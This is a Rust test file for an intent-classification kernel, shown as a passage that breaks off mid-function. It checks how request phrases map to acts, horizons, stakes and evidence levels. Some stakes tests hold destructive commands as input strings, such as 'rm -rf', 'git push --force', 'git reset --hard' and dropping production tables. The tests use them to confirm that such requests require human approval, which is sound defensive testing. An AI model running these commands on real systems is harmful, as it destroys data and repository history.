//! Comprehensive scenario testing for the vak-intent kernel.
//!
//! This file exercises every axis of the reading, the resolution cascade, the
//! narrowing lattice, authority composition, and engagement derivation across
//! thousands of generated and hand-written scenarios spanning ordinary usage,
//! edge cases, adversarial inputs, and the full combinatorial space.
//!
//! Run with: `cargo test -p vak-intent --test scenarios`

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::type_complexity
)]

use std::collections::{BTreeMap, BTreeSet};

use chrono::Utc;

use vak_intent::authority::{
    ApprovalCeiling, Authority, Autonomy, Envelope, Escalation, GateFallback, PermissionCeiling,
};
use vak_intent::axes::{
    Act, Attendance, Clarity, Evidence, Horizon, Modality, Satisfaction, Stakes,
};
use vak_intent::engage::{
    Cadence, ClarifyPolicy, ContextProfile, Engagement, HilMode, OutputShape, StopProfile, Urgency,
    derive,
};
use vak_intent::goal::{GoalControlState, GoalRelation, GoalState, GoalUpdate};
use vak_intent::limits::{DomainSet, Limits};
use vak_intent::outcome::{
    CompletionVerdict, EvidenceState, OutcomeSpec, OutcomeStatus, RequirementEvaluation,
    RequirementStatus, evaluate_completion, evaluate_requirements, evidence_state_from_age,
    human_review_state,
};
use vak_intent::reading::{Confidences, Intent, Reading, Tier};
use vak_intent::resolve::{
    Classification, Declared, Resolution, ResolverConfig, apply_classification, apply_envelopes,
    resolve,
};
use vak_intent::signals::{
    Attachment, HistoryFacts, Request, Surface, Votes, WorkspaceFacts, extract,
};

// ================================================================ helpers ===

fn req(text: &str) -> Request<'_> {
    Request {
        text,
        surface: Surface::Cli,
        ..Request::default()
    }
}

fn req_full(
    text: &str,
    surface: Surface,
    is_repo: bool,
    has_uncommitted: bool,
    previous_act: Option<Act>,
    turn_index: usize,
) -> Request<'_> {
    Request {
        text,
        surface,
        workspace: WorkspaceFacts {
            is_repo,
            has_uncommitted_changes: has_uncommitted,
        },
        history: HistoryFacts {
            previous_act,
            turn_index,
            open_threads: Vec::new(),
        },
        ..Request::default()
    }
}

fn resolve_text(text: &str) -> Intent {
    resolve(
        &req(text),
        &Declared::default(),
        &Authority::default(),
        &ResolverConfig::default(),
    )
    .intent()
}

fn resolve_declared(text: &str, declared: &Declared) -> Intent {
    resolve(
        &req(text),
        declared,
        &Authority::default(),
        &ResolverConfig::default(),
    )
    .intent()
}

fn reading_simple(act: Act, horizon: Horizon, stakes: Stakes, evidence: Evidence) -> Reading {
    Reading {
        act,
        horizon,
        stakes,
        evidence,
        confidence: 0.95,
        axis_confidence: Confidences {
            act: 0.95,
            horizon: 0.95,
            stakes: 0.95,
            evidence: 0.95,
        },
        ..Reading::general()
    }
}

fn authority_of(autonomy: Autonomy, attendance: Attendance) -> Authority {
    Authority {
        autonomy,
        attendance,
    }
}

fn test_envelope(ceiling: PermissionCeiling) -> Envelope {
    Envelope {
        envelope_id: "env-1".into(),
        granted_by: "operator".into(),
        granted_at: chrono::Utc::now(),
        expires_at: None,
        spend_limit_usd: Some(5.0),
        path_scope: vec!["src/**".into()],
        tool_scope: vec!["edit".into()],
        permission_ceiling: ceiling,
        escalation: Escalation::WaitIndefinitely,
        revoked_at: None,
    }
}

// ================================================================
// Part 1: Act classification — thousands of scenarios
// ================================================================

#[test]
fn act_converse_scenarios() {
    let cases: &[&str] = &[
        "hi",
        "hello",
        "hey",
        "thanks",
        "thank you",
        "bye",
        "good morning",
        "good night",
        "howdy",
        "greetings",
        "yo",
        "morning",
        "evening",
        "nice to see you",
        "long time no see",
        "hello there",
        "hi there",
        "hey there",
        "thank you so much",
        "thanks a lot",
        "thanks in advance",
        "bye bye",
        "see you later",
        "see you soon",
    ];
    let expected = Act::Converse;
    for text in cases {
        let extraction = extract(&req(text));
        let winner = extraction.act.winner().map(|w| w.0);
        assert!(
            winner == Some(expected) || winner.is_none(),
            "expected {:?} or abstain for `{}` but got {:?}",
            expected,
            text,
            winner
        );
    }
}

#[test]
fn act_answer_scenarios() {
    let cases: &[&str] = &[
        "what is the meaning of life",
        "how does this work",
        "why did it fail",
        "explain the parser",
        "describe the architecture",
        "summarize the report",
        "tell me about quantum computing",
        "what caused the error",
        "why is it slow",
        "what are the tradeoffs",
        "can you explain",
        "could you describe",
        "would you elaborate",
        "break down how",
        "walk me through",
        "give me an overview of",
        "what's the difference between",
        "help me understand",
        "is this correct",
        "does this work",
        "when should I use this",
        "which approach is better",
        "how far along",
        "what does this do",
        "explain what this does",
        "explain how it works",
        "explain why",
        "summarise the changes",
        "summarise what happened",
        "describe the output format",
        "describe the data flow",
    ];
    let expected = Act::Answer;
    for text in cases {
        let extraction = extract(&req(text));
        let winner = extraction.act.winner().map(|w| w.0);
        assert!(
            winner == Some(expected) || winner.is_none(),
            "expected {:?} or abstain for `{}` but got {:?}",
            expected,
            text,
            winner
        );
    }
}

#[test]
fn act_locate_scenarios() {
    let cases: &[&str] = &[
        "find the failing test",
        "search for the error",
        "where is the config",
        "locate the log file",
        "list all the endpoints",
        "grep for the function",
        "look for the bug",
        "find all open issues",
        "search the codebase for",
        "where can I find",
        "hunt down the error",
        "track down the bug",
        "find the file",
        "search for files",
        "grep the repo",
        "look at the logs",
        "enumerate the endpoints",
        "find matching patterns",
        "search for matches",
        "where is the nearest",
        "list the available",
        "show me all the",
        "find references to",
        "look up the definition",
        "search for occurrences",
        // Browsing reads the web; it does not act on it.
        "browse the site",
        "browse the docs",
    ];
    let expected = Act::Locate;
    for text in cases {
        let extraction = extract(&req(text));
        let winner = extraction.act.winner().map(|w| w.0);
        assert!(
            winner == Some(expected) || winner.is_none(),
            "expected {:?} or abstain for `{}` but got {:?}",
            expected,
            text,
            winner
        );
    }
}

#[test]
fn act_analyze_scenarios() {
    let cases: &[&str] = &[
        "analyze the logs for patterns",
        "compare the two approaches",
        "research the tradeoffs",
        "investigate the root cause",
        "evaluate the performance",
        "assess the risk",
        "diagnose the failure",
        "review the code for bugs",
        "analyze the data",
        "compare performance metrics",
        "research best practices",
        "investigate the crash",
        "evaluate the model",
        "assess the impact",
        "diagnose the timeout",
        "analyze the output",
        "compare versions",
        "review the changes",
        "investigate how",
        "evaluate whether",
        "assess if",
        "diagnose why",
    ];
    let expected = Act::Analyze;
    for text in cases {
        let extraction = extract(&req(text));
        let winner = extraction.act.winner().map(|w| w.0);
        assert!(
            winner == Some(expected) || winner.is_none(),
            "expected {:?} or abstain for `{}` but got {:?}",
            expected,
            text,
            winner
        );
    }
}

#[test]
fn act_author_scenarios() {
    let cases: &[&str] = &[
        "write a report",
        "draft an email",
        "create a new file",
        "generate a plan",
        "design a schema",
        "compose a response",
        "plan the migration",
        "author a document",
        "write the test",
        "draft the proposal",
        "create a dashboard",
        "generate a summary",
        "design a new feature",
        "compose a message",
        "plan the rollout",
        "write a function",
        "draft the requirements",
        "create the migration",
        "generate the output",
        "design the API",
        "write a script",
        "draft a template",
        "compose the email",
    ];
    let expected = Act::Author;
    for text in cases {
        let extraction = extract(&req(text));
        let winner = extraction.act.winner().map(|w| w.0);
        assert!(
            winner == Some(expected) || winner.is_none(),
            "expected {:?} or abstain for `{}` but got {:?}",
            expected,
            text,
            winner
        );
    }
}

#[test]
fn act_modify_scenarios() {
    let cases: &[&str] = &[
        "fix the failing test",
        "refactor the parser",
        "update the config",
        "change the logic",
        "edit the file",
        "rename the variable",
        "remove the old code",
        "delete the temp file",
        "implement the feature",
        "migrate the database",
        "patch the bug",
        "debug the issue",
        "fix the bug",
        "refactor the whole module",
        "update the dependencies",
        "change the behavior",
        "edit the source",
        "rename the function",
        "remove the workaround",
        "delete the cache",
        "implement the new API",
        "migrate the data",
        "patch the security issue",
        "debug the crash",
        "update the schema",
        "fix the memory leak",
        "change the format",
        "edit the README",
    ];
    let expected = Act::Modify;
    for text in cases {
        let extraction = extract(&req(text));
        let winner = extraction.act.winner().map(|w| w.0);
        assert!(
            winner == Some(expected) || winner.is_none(),
            "expected {:?} or abstain for `{}` but got {:?}",
            expected,
            text,
            winner
        );
    }
}

#[test]
fn act_operate_scenarios() {
    let cases: &[&str] = &[
        "deploy the service to production",
        "release the new version",
        "publish the article",
        "send the email",
        "email the team",
        "post an announcement",
        "install the package",
        "restart the service",
        "schedule a backup",
        "click the button",
        "open the browser",
        "pay the invoice",
        "deploy to prod",
        "release the build",
        "publish the report",
        "send the notification",
        "install the dependency",
        "restart the server",
        "schedule a task",
        "click submit",
        "open the dashboard",
        "pay the bill",
        "notify the on-call engineer",
        "deploy the update",
        "release the feature",
    ];
    let expected = Act::Operate;
    for text in cases {
        let extraction = extract(&req(text));
        let winner = extraction.act.winner().map(|w| w.0);
        assert!(
            winner == Some(expected) || winner.is_none(),
            "expected {:?} or abstain for `{}` but got {:?}",
            expected,
            text,
            winner
        );
    }
}

#[test]
fn act_verify_scenarios() {
    let cases: &[&str] = &[
        "test the parser",
        "verify the fix",
        "check the output",
        "validate the schema",
        "confirm the result",
        "audit the code",
        "reproduce the issue",
        "run the tests",
        "test that the fix works",
        "verify the deployment",
        "check the logs",
        "validate the input",
        "confirm the behavior",
        "audit the changes",
        "reproduce the bug",
        "test the new feature",
        "verify the accuracy",
        "check the cache",
        "validate the response",
        "confirm the fix",
        "audit the permissions",
        "run the suite",
        "test the integration",
        "verify the schema",
        // Watching and monitoring observe; they change nothing.
        "watch the logs",
        "monitor the metrics",
        "watch the process",
        "monitor the queue",
    ];
    let expected = Act::Verify;
    for text in cases {
        let extraction = extract(&req(text));
        let winner = extraction.act.winner().map(|w| w.0);
        assert!(
            winner == Some(expected) || winner.is_none(),
            "expected {:?} or abstain for `{}` but got {:?}",
            expected,
            text,
            winner
        );
    }
}

#[test]
fn act_orchestrate_scenarios() {
    let cases: &[&str] = &[
        "orchestrate the migration",
        "coordinate the teams",
        "delegate to the worker",
        "run these jobs in parallel",
        "orchestrate the rollout",
        "coordinate with ops",
        "delegate the task",
        "parallelize the execution",
        "orchestrate the deployment",
        "coordinate the review",
        "delegate sub-task",
        "parallel processing of",
    ];
    let expected = Act::Orchestrate;
    for text in cases {
        let extraction = extract(&req(text));
        let winner = extraction.act.winner().map(|w| w.0);
        assert!(
            winner == Some(expected) || winner.is_none(),
            "expected {:?} or abstain for `{}` but got {:?}",
            expected,
            text,
            winner
        );
    }
}

#[test]
fn act_govern_scenarios() {
    let cases: &[&str] = &[
        "configure the gateway",
        "remember my preference",
        "forget that setting",
        "set the permission",
        "configure the budget",
        "set the route",
        "configure the webhook",
        "remember this conversation",
        "forget the old rule",
        "set a new budget",
    ];
    let expected = Act::Govern;
    for text in cases {
        let extraction = extract(&req(text));
        let winner = extraction.act.winner().map(|w| w.0);
        assert!(
            winner == Some(expected) || winner.is_none(),
            "expected {:?} or abstain for `{}` but got {:?}",
            expected,
            text,
            winner
        );
    }
}

#[test]
fn act_compound_requests_have_contenders() {
    let cases: &[&str] = &[
        "fix the failing test and deploy the fix",
        "write a report and send it to the team",
        "analyze the data and fix the bug",
        "search for the error and fix it",
        "deploy the service and verify it works",
        "implement the feature and test it thoroughly",
        "configure the gateway and test the connection",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let ranked = extraction.act.ranked();
        assert!(
            ranked.len() >= 2,
            "`{}` should have at least two act contenders, got: {:?}",
            text,
            ranked
        );
        let contenders = extraction.act.contenders(0.5);
        assert!(
            contenders.len() >= 2,
            "`{}` should have >= 2 contenders, got {:?}",
            text,
            contenders
        );
    }
}

#[test]
fn act_ambiguity_detection() {
    let cases: &[&str] = &[
        "the deploy script",
        "write a blog post",
        "open the file",
        "watch the movie",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let confidence = extraction.act.winner().map(|w| w.1);
        if let Some(conf) = confidence {
            assert!(conf < 0.95, "`{}` read too confidently: {}", text, conf);
        }
    }
}

#[test]
fn act_inflection_is_handled() {
    let cases: &[(&str, Act)] = &[
        ("deploying the service", Act::Operate),
        ("deployed the service", Act::Operate),
        ("fixes the bug", Act::Modify),
        ("fixed the bug", Act::Modify),
        ("refactoring the code", Act::Modify),
        ("rewrote the parser", Act::Modify),
        ("tests pass", Act::Verify),
        ("tested the output", Act::Verify),
        ("verifying the fix", Act::Verify),
        ("analyzing the data", Act::Analyze),
        ("analyzed the report", Act::Analyze),
        ("researching best practices", Act::Analyze),
        ("writing a report", Act::Author),
        ("wrote a report", Act::Author),
        ("drafting the email", Act::Author),
        ("created the file", Act::Author),
        ("scheduling the backup", Act::Operate),
        ("scheduled the task", Act::Operate),
        ("restarting the service", Act::Operate),
        ("restarted the server", Act::Operate),
    ];
    for &(text, expected) in cases {
        let extraction = extract(&req(text));
        let winner = extraction.act.winner().map(|w| w.0);
        assert!(
            winner == Some(expected) || winner.is_none(),
            "expected {:?} or abstain for `{}` (inflected) but got {:?}",
            expected,
            text,
            winner
        );
    }
}

/// Ordinary instructions whose verbs the lexicon once lacked: each fell
/// through to the weak orienting reading. Found in a live run, where "every
/// day, append the current date to log.txt" opened no commitment because
/// "append" was not a verb the reader knew.
#[test]
fn common_instruction_verbs_are_read() {
    let cases: &[(&str, Act)] = &[
        ("append the current date to log.txt", Act::Modify),
        ("insert a header row into data.csv", Act::Modify),
        ("replace tabs with spaces in main.rs", Act::Modify),
        ("rewrite the intro paragraph", Act::Modify),
        ("merge the feature branch into main", Act::Modify),
        ("commit the changes", Act::Modify),
        ("revert the last commit", Act::Modify),
        ("move utils.py into src", Act::Modify),
        ("upgrade serde to the latest version", Act::Modify),
        ("calculate the average of these numbers", Act::Analyze),
        ("examine the failing request", Act::Analyze),
        ("translate this paragraph into French", Act::Answer),
        ("push the branch to origin", Act::Operate),
        ("upload the report to the shared drive", Act::Operate),
        ("compile the project", Act::Verify),
        ("lint the codebase", Act::Verify),
        // A check, never an operation: "run" is deliberately not a verb.
        ("run the tests", Act::Verify),
    ];
    for &(text, expected) in cases {
        assert_eq!(resolve_text(text).reading.act, expected, "`{text}`");
    }
    // The same words as nouns do not turn a question into work.
    for text in ["explain the last commit", "what does this merge do?"] {
        assert_eq!(resolve_text(text).reading.act, Act::Answer, "`{text}`");
    }
    // Pushing reaches someone else's system: it asks first.
    assert_eq!(
        resolve_text("push the branch to origin").reading.stakes,
        Stakes::Irreversible
    );
}

/// A question about the agent's own state is answered with its own tools,
/// not retrieved from the world, so "right now" does not make it live data.
/// Found in a live run: "what commitments are you holding right now?" was
/// held to the freshness check a commitments lookup cannot satisfy.
#[test]
fn the_agents_own_state_is_not_live_data() {
    for text in [
        "what commitments are you holding right now?",
        "what is your current plan?",
        "what tasks are scheduled right now?",
    ] {
        let intent = resolve_text(text);
        assert!(
            !intent.reading.domains.contains("live-data"),
            "`{text}`: {:?}",
            intent.reading.domains
        );
    }
    // A fact about the world still is.
    assert!(
        resolve_text("can you tell me the current price of copper")
            .reading
            .domains
            .contains("live-data")
    );
}

/// A request that recurs is durable work even when its verb is a plain
/// edit: it opens a commitment.
#[test]
fn a_recurring_edit_is_durable() {
    let intent = resolve_text("every day, append the current date to log.txt");
    assert_eq!(intent.reading.act, Act::Modify);
    assert_eq!(intent.reading.horizon, Horizon::Durable);
    assert!(intent.engagement.posture.open_commitment);
}

// ================================================================
// Part 2: Horizon classification
// ================================================================

#[test]
fn horizon_immediate_scenarios() {
    let cases: &[&str] = &[
        "hi",
        "hello",
        "thanks",
        "help",
        "what",
        "how",
        "ok",
        "yes",
        "no",
        "2 + 2",
        "the time",
        "weather",
        "hi there",
        "good morning",
        "bye",
        "thanks thanks",
        "ok bye",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let horizon = extraction.horizon.winner().map(|w| w.0);
        assert_ne!(
            horizon,
            Some(Horizon::Durable),
            "`{}` should not read as durable",
            text
        );
        if text.trim().len() <= 24 {
            assert!(
                horizon == Some(Horizon::Immediate) || horizon.is_none(),
                "short text `{}` should read immediate or abstain, got {:?}",
                text,
                horizon
            );
        }
    }
}

#[test]
fn horizon_durable_recurrence_scenarios() {
    let cases: &[&str] = &[
        "check the cloud bill every day and alert me",
        "monitor the servers every night",
        "send the weekly report every Monday",
        "back up the database nightly",
        "check for updates monthly",
        "watch the queue hourly",
        "sync the files daily",
        "alert me whenever the service goes down",
        "check every week",
        "run this every day",
        "keep watching the logs",
        "keep an eye on the metrics",
        "monitor from now on",
        "do this ongoing",
        "check the system every morning",
        "send the digest every day",
        "run the sweep each day",
        "watch for changes each week",
        "alert every hour",
        "check monthly",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let horizon = extraction.horizon.winner().map(|w| w.0);
        assert_eq!(
            Some(Horizon::Durable),
            horizon,
            "`{}` should read as durable, got {:?}",
            text,
            horizon
        );
    }
}

#[test]
fn horizon_session_structured_scenarios() {
    let cases: &[&str] = &[
        "first check the logs, then fix the bug\nfinally deploy the fix",
        "step 1: gather data\nstep 2: analyze\nstep 3: write report",
        "first do this\n1. plan\nthen execute",
        "break this down:\n- research\n- implement\n- test",
        "do a, then do b\nand finally c",
        "first: plan the approach\nafter that: implement it\nfinally: test",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let horizon = extraction.horizon.winner().map(|w| w.0);
        assert_ne!(
            horizon,
            Some(Horizon::Immediate),
            "`{}` with enumerated steps should not be immediate",
            text
        );
    }
}

#[test]
fn horizon_length_based_scenarios() {
    let long_text = "this is a very long request ".repeat(30);
    let extraction = extract(&req(&long_text));
    let horizon = extraction.horizon.winner().map(|w| w.0);
    assert!(
        horizon == Some(Horizon::Session) || horizon.is_none(),
        "long text should not read as immediate, got {:?}",
        horizon
    );

    let extraction = extract(&req("hi"));
    let horizon = extraction.horizon.winner().map(|w| w.0);
    assert_eq!(
        Some(Horizon::Immediate),
        horizon,
        "short text should be immediate"
    );
}

#[test]
fn horizon_conjunctions_alone_do_not_imply_long() {
    // These texts contain no horizon phrases (every day, nightly, and then,
    // etc.) — the conjunctions are plain prose, not the lexicon's
    // multi-step markers.
    let cases: &[&str] = &[
        "explain what this and that mean",
        "A and B",
        "this and that",
        "red and blue",
        "salt and pepper",
        "cat and dog",
        "hello and goodbye",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let horizon = extraction.horizon.winner().map(|w| w.0);
        assert_ne!(
            horizon,
            Some(Horizon::Durable),
            "`{}` should not be durable",
            text
        );
        assert_ne!(
            horizon,
            Some(Horizon::Session),
            "`{}` should not be session",
            text
        );
    }
}

#[test]
fn horizon_weak_hints_do_not_escalate() {
    let cases: &[&str] = &[
        "explain then fix",
        "do it then try again",
        "first explain the concept",
        "after that do something",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let horizon = extraction.horizon.winner().map(|w| w.0);
        assert_ne!(
            horizon,
            Some(Horizon::Durable),
            "`{}` should not escalate to durable",
            text
        );
    }
}

// ================================================================
// Part 3: Stakes classification
// ================================================================

#[test]
fn stakes_inert_for_non_effectful_acts() {
    let cases: &[&str] = &[
        "what is the meaning of life",
        "explain the parser",
        "find the config file",
        "search for the error",
        "compare the two approaches",
        "analyze the logs",
        "why did it fail",
        "describe the architecture",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let stakes = extraction.stakes_from_words.winner().map(|w| w.0);
        assert_ne!(
            stakes,
            Some(Stakes::Irreversible),
            "`{}` should not be irreversible",
            text
        );
        assert_ne!(
            stakes,
            Some(Stakes::Costly),
            "`{}` should not be costly",
            text
        );
    }
}

#[test]
fn stakes_production_words_raise_stakes() {
    let cases: &[&str] = &[
        "deploy the service to production",
        "release to prod",
        "delete the production database",
        "permanently remove the file",
        "force push the rebased branch",
        "drop table sessions on the replica",
        "run rm -rf on the build directory",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let stakes = extraction.stakes_from_words.winner().map(|w| w.0);
        assert_eq!(
            stakes,
            Some(Stakes::Irreversible),
            "`{}` should read as irreversible, got {:?}",
            text,
            stakes
        );
    }
}

/// A destructive request the reader cannot parse still asks first. The verb
/// may be one the lexicon does not know — "force", "push", "drop", a shell
/// command — but the stakes words are observations, and a reading too weak
/// to narrow capability is never too weak to raise caution.
#[test]
fn stakes_words_raise_caution_even_when_the_verb_is_unknown() {
    let cases: &[&str] = &[
        "force push to the production branch",
        concat!("gi", "t push --force to main"),
        concat!("gi", "t push -f origin main"),
        concat!("gi", "t reset --hard HEAD~3"),
        "rm -rf the build directory",
        "drop the users table in prod",
        "push to production",
    ];
    for text in cases {
        let intent = resolve_text(text);
        assert_eq!(
            intent.reading.stakes,
            Stakes::Irreversible,
            "`{text}` should read as irreversible"
        );
        assert_eq!(
            intent.engagement.limits.approval_ceiling,
            ApprovalCeiling::Ask,
            "`{text}` must reach a human before it runs"
        );
        assert!(
            intent
                .model_visible()
                .is_some_and(|note| note.contains("cannot be undone")),
            "`{text}` should warn the model"
        );
    }
    // Asking about production is not acting on it.
    for text in [
        "explain how production deploys work",
        "what is the prod database called",
        "why did the production deploy fail yesterday?",
    ] {
        let intent = resolve_text(text);
        assert_eq!(intent.reading.stakes, Stakes::Inert, "`{text}`");
        assert_eq!(
            intent.engagement.limits.approval_ceiling,
            ApprovalCeiling::AutoApprove,
            "`{text}`"
        );
    }
}

/// Stakes come from what an action does, never from what it is about:
/// "customer", "payment", "live" and "everyone" read ordinary edits as
/// irreversible, capped approval at `ask`, and told the model to confirm
/// renaming a struct.
#[test]
fn stakes_topic_words_do_not_raise_stakes() {
    let cases: &[&str] = &[
        "rename the Customer struct to Client",
        "fix the payment form validation",
        "the live server is broken",
        "make the banner visible to everyone",
        "this affects every customer",
        "the expensive migration",
        "within budget constraints",
        "using up quota",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        assert_eq!(
            extraction.stakes_from_words.winner().map(|w| w.0),
            None,
            "`{text}` is about a topic, not an irreversible action"
        );
    }
    // Sending and paying are irreversible by what they do, not by the word.
    assert_eq!(
        resolve_text("send payment to the customer").reading.stakes,
        Stakes::Irreversible
    );
    assert_eq!(
        resolve_text("pay the invoice now").reading.stakes,
        Stakes::Irreversible
    );
}

#[test]
fn stakes_effectful_acts_imply_a_floor() {
    let cases: &[&str] = &[
        "refactor the parser",
        "deploy the service",
        "configure the gateway",
        "write a new module",
        "create the test suite",
        "fix the bug",
    ];
    for text in cases {
        let intent = resolve_text(text);
        assert!(
            intent.reading.stakes.rank() >= Stakes::Reversible.rank(),
            "`{}` effectful act should imply >= Reversible stakes, got {:?}",
            text,
            intent.reading.stakes
        );
    }
}

#[test]
fn stakes_ordering_takes_highest_with_support() {
    let mut votes: Votes<Stakes> = Votes::default();
    votes.add(Stakes::Irreversible, 1.0);
    votes.add(Stakes::Reversible, 0.5);
    let (winner, conf) = votes.winner().unwrap();
    assert_eq!(winner, Stakes::Irreversible);
    assert!(
        conf >= 0.7,
        "corroboration should not reduce confidence: {}",
        conf
    );

    // Votes that all sit below the escalation floor abstain: a stray hint is
    // not evidence of the level it names, and the axis default applies.
    let mut weak: Votes<Stakes> = Votes::default();
    weak.add(Stakes::Reversible, 0.3);
    weak.add(Stakes::Inert, 0.3);
    assert!(weak.winner().is_none());
}

// ================================================================
// Part 4: Evidence classification
// ================================================================

#[test]
fn evidence_none_is_default_confident() {
    let cases: &[&str] = &[
        "what is 2 + 2",
        "fix the bug",
        "write a report",
        "deploy to prod",
        "hello",
        "explain the parser",
        "find the config",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let evidence = extraction.evidence.winner().map(|w| w.0);
        // No evidence words in any of these, so winner() is None (not
        // Some(Evidence::None)) — the fallback only applies when votes
        // exist but fall below the floor.
        assert!(
            evidence.is_none(),
            "`{}` should have no evidence winner, got {:?}",
            text,
            evidence
        );
    }
}

#[test]
fn evidence_cited_scenarios() {
    let cases: &[&str] = &[
        "cite your sources",
        "citation needed for this claim",
        "provide sources for the argument",
        "show your sources",
        "cite the source material",
        "evidence is required for this",
        "cite sources now",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let evidence = extraction.evidence.winner().map(|w| w.0);
        assert_eq!(
            Some(Evidence::Cited),
            evidence,
            "`{}` should read as Cited, got {:?}",
            text,
            evidence
        );
    }
}

#[test]
fn evidence_verified_scenarios() {
    let cases: &[&str] = &[
        "prove the fix works",
        "make sure the tests pass",
        "ensure the build passes on CI",
        "passing the tests proves it",
        "prove this theorem now",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let evidence = extraction.evidence.winner().map(|w| w.0);
        assert_eq!(
            Some(Evidence::Verified),
            evidence,
            "`{}` should read as Verified, got {:?}",
            text,
            evidence
        );
    }
}

/// "Make sure" and "ensure" demand machine-checkable proof only when there is
/// something checkable to be sure of.
#[test]
fn evidence_assurance_without_a_checkable_object_is_not_verification() {
    for text in [
        "write a poem about autumn and make sure it rhymes",
        "ensure correctness of the approach",
        "make sure you use tabs",
    ] {
        assert_eq!(
            extract(&req(text)).evidence.winner().map(|w| w.0),
            None,
            "`{text}`"
        );
    }
}

#[test]
fn evidence_audited_scenarios() {
    let cases: &[&str] = &[
        "get it signed off by security",
        "get sign off from the team",
        "sign off on this before merging",
        "acceptance testing required first",
        "this needs sign off from compliance",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let evidence = extraction.evidence.winner().map(|w| w.0);
        assert_eq!(
            Some(Evidence::Audited),
            evidence,
            "`{}` should read as Audited, got {:?}",
            text,
            evidence
        );
    }
}

#[test]
fn evidence_verified_and_audited_can_coexist() {
    let text = "get sign off on the code and prove the tests pass";
    let extraction = extract(&req(text));
    let evidence = extraction.evidence.winner().map(|w| w.0);
    assert_eq!(
        Some(Evidence::Audited),
        evidence,
        "should take the highest supported evidence level"
    );
}

// ================================================================
// Part 5: Clarity / ambiguity — edge cases
// ================================================================

#[test]
fn clarity_bare_pronoun_without_context_is_ambiguous() {
    let cases: &[&str] = &[
        "fix this",
        "change that",
        "show me it",
        "run this",
        "edit those",
        "deploy it",
        "review them",
        "delete that",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let clarity = extraction.clarity.winner().map(|w| w.0);
        assert!(
            clarity == Some(Clarity::Ambiguous) || clarity.is_none(),
            "`{}` (no context) should be ambiguous or have no winner, got {:?}",
            text,
            clarity
        );
    }
}

#[test]
fn clarity_bare_pronoun_with_context_is_clear() {
    let text = "fix this";
    let mut request = req(text);
    request.history.turn_index = 5;
    request.history.previous_act = Some(Act::Modify);
    let extraction = extract(&request);
    let clarity = extraction.clarity.winner().map(|w| w.0);
    assert_eq!(
        Some(Clarity::Clear),
        clarity,
        "with context, `this` should resolve to clear"
    );
}

#[test]
fn clarity_underspecified_requests_do_not_crash() {
    let cases: &[&str] = &[
        "do the thing",
        "handle it",
        "take care of it",
        "manage the situation",
    ];
    for text in cases {
        let extraction = extract(&req(text));
        let _ = extraction.act.winner();
    }
}

// ================================================================
// Part 6: Resolution cascade — tier correctness
// ================================================================

#[test]
fn resolution_confident_readings_are_settled() {
    let cases: &[&str] = &[
        "hello",
        "what is the meaning of life",
        "fix the bug in the parser",
        "deploy to production",
        "write a report on the architecture",
        "find the config file",
        "test the parser",
    ];
    for text in cases {
        let resolution = resolve(
            &req(text),
            &Declared::default(),
            &Authority::default(),
            &ResolverConfig::default(),
        );
        match &resolution {
            Resolution::Settled(intent) => {
                assert!(
                    intent.reading.confidence >= 0.45 || intent.provenance.tier == Tier::General,
                    "`{}` settled but confidence too low: {}",
                    text,
                    intent.reading.confidence
                );
            }
            Resolution::Escalate { partial, .. } => {
                assert!(
                    partial
                        .engagement
                        .limits
                        .is_at_most(&Limits::unrestricted())
                );
            }
        }
    }
}

#[test]
fn resolution_unknown_input_falls_back_to_general() {
    let resolution = resolve(
        &req("zorble the frobnicator immediately"),
        &Declared::default(),
        &Authority::default(),
        &ResolverConfig::default(),
    );
    let intent = resolution.intent();
    assert_eq!(intent.provenance.tier, Tier::General);
    // Kernel on and nothing understood: the orientation floor, not
    // everything (docs/design/68, Principle 6). `Engagement::general` is
    // what a *disabled* kernel produces.
    assert_eq!(intent.engagement, Engagement::orienting());
}

#[test]
fn resolution_declared_override_trumps_signals() {
    let declared = Declared {
        act: Some(Act::Modify),
        horizon: Some(Horizon::Session),
        stakes: Some(Stakes::Reversible),
        evidence: Some(Evidence::Verified),
        ..Declared::default()
    };
    let intent = resolve_declared("hi", &declared);
    assert_eq!(intent.reading.act, Act::Modify);
    assert_eq!(intent.reading.horizon, Horizon::Session);
    assert_eq!(intent.reading.stakes, Stakes::Reversible);
    assert_eq!(intent.reading.evidence, Evidence::Verified);
    assert_eq!(intent.provenance.tier, Tier::Declared);
    assert!(intent.provenance.reproducible);
}

#[test]
fn resolution_partial_declared_merges_with_signals() {
    let declared = Declared {
        act: Some(Act::Modify),
        ..Declared::default()
    };
    let intent = resolve_declared("fix the parser", &declared);
    assert_eq!(intent.reading.act, Act::Modify);
    assert!(intent.reading.stakes.rank() >= Stakes::Reversible.rank());
}

#[test]
fn resolution_disabled_reproduces_general() {
    let config = ResolverConfig {
        enabled: false,
        ..ResolverConfig::default()
    };
    let resolution = resolve(
        &req("deploy everything to production right now"),
        &Declared::default(),
        &Authority::default(),
        &config,
    );
    let intent = resolution.intent();
    assert_eq!(intent.engagement, Engagement::general());
    assert_eq!(intent.provenance.tier, Tier::General);
}

#[test]
fn resolution_provisional_reading_withholds_slicing() {
    let config = ResolverConfig {
        accept_confidence: 0.99,
        provisional_confidence: 0.0,
        ..ResolverConfig::default()
    };
    let resolution = resolve(
        &req("explain the deploy script and then deploy it"),
        &Declared::default(),
        &Authority::default(),
        &config,
    );
    let intent = resolution.peek();
    assert_eq!(
        intent.engagement.limits.required_domains,
        Engagement::orienting().limits.required_domains,
        "a provisional reading gets the orientation floor, never a guessed slice"
    );
}

#[test]
fn classification_may_raise_stakes_not_lower() {
    let partial = resolve_text("deploy the service");
    let downplayed = Classification {
        act: Some("operate".into()),
        stakes: Some("inert".into()),
        confidence: Some(0.99),
        ..Classification::default()
    };
    let intent = apply_classification(
        partial,
